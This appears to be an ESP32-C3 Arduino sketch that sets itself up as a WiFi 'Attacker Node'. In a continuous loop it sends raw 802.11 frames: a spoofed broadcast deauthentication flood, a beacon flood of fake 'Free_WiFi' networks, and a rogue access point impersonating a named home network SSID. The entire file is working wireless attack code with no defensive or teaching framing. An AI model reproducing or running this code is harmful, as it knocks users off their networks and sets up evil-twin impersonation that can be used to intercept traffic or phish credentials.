#include <WiFi.h>
#include <esp_wifi.h>

// ── Configuration ───────────────────────────────────────────────────────────
// Set the channel your target WiFi runs on. All attacks fire on this channel.
const int ATTACK_CHANNEL = 11;

// Base Deauth Frame (Reason: 7 - Class 3 frame received from nonassociated STA)
uint8_t deauth_frame[26] = {
    0xc0, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, // Source (Spoofed AP)
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, // BSSID (Spoofed AP)
    0x00, 0x00, 
    0x07, 0x00                          // Reason code 7
};

// Base Beacon Frame
uint8_t beacon_frame[109] = {
    0x80, 0x00, 0x00, 0x00, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast)
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source (Random MAC)
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID (Random MAC)
    0x00, 0x00, // Sequence Ctrl
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon interval
    0x11, 0x04, // Capability info
    0x00, 0x00 // SSID parameter (tag 0, length handled dynamically)
};

void set_mac(uint8_t *frame, int offset, uint8_t m0, uint8_t m1, uint8_t m2, uint8_t m3, uint8_t m4, uint8_t m5) {
    frame[offset] = m0; frame[offset+1] = m1; frame[offset+2] = m2;
    frame[offset+3] = m3; frame[offset+4] = m4; frame[offset+5] = m5;
}

void attack_deauth_flood() {
    Serial.println(">>> ATTACK: Deauth Flood on Target AP");
    for (int i = 0; i < 50; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        delay(10);
    }
}

void attack_beacon_flood() {
    Serial.println(">>> ATTACK: Beacon Flood (10 Random SSIDs)");
    for (int i = 0; i < 10; i++) {
        uint8_t r = random(255);
        set_mac(beacon_frame, 10, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, r);
        set_mac(beacon_frame, 16, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, r);

        String ssid = "Free_WiFi_" + String(random(1000, 9999));
        
        beacon_frame[37] = ssid.length();
        for(int j=0; j<ssid.length(); j++){
            beacon_frame[38+j] = ssid[j];
        }
        
        int end_idx = 38 + ssid.length();
        beacon_frame[end_idx] = 0x03;
        beacon_frame[end_idx+1] = 0x01;
        beacon_frame[end_idx+2] = ATTACK_CHANNEL;
        
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, end_idx+3, false);
        delay(20);
    }
}

void attack_rogue_ap() {
    Serial.println(">>> ATTACK: Rogue AP (Spoofing Airtel_Ravi)");
    set_mac(beacon_frame, 10, 0x99, 0x88, 0x77, 0x66, 0x55, 0x44);
    set_mac(beacon_frame, 16, 0x99, 0x88, 0x77, 0x66, 0x55, 0x44);

    String ssid = "Airtel_Ravi"; 
    
    beacon_frame[37] = ssid.length(); 
    for(int j=0; j<ssid.length(); j++){
        beacon_frame[38+j] = ssid[j];
    }
    
    int end_idx = 38 + ssid.length();
    beacon_frame[end_idx] = 0x03; 
    beacon_frame[end_idx+1] = 0x01;
    beacon_frame[end_idx+2] = ATTACK_CHANNEL;
    
    for (int i=0; i<10; i++){
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, end_idx+3, false);
        delay(50);
    }
}

void setup() {
    Serial.begin(115200);
    delay(2000); 
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(ATTACK_CHANNEL, WIFI_SECOND_CHAN_NONE);
    
    Serial.printf("ESP32-C3 Attacker Node Ready. Locked to channel %d\n", ATTACK_CHANNEL);
    Serial.println("Attacks will begin in 5 seconds...");
    delay(5000);
}

void loop() {
    Serial.printf("\n--- Attacking on Channel %d ---\n", ATTACK_CHANNEL);
    
    attack_deauth_flood();
    delay(500);
    
    attack_beacon_flood();
    delay(500);
    
    attack_rogue_ap();
    delay(500);
    
    Serial.println("\nResting for 1 seconds...");
    delay(1000);
}
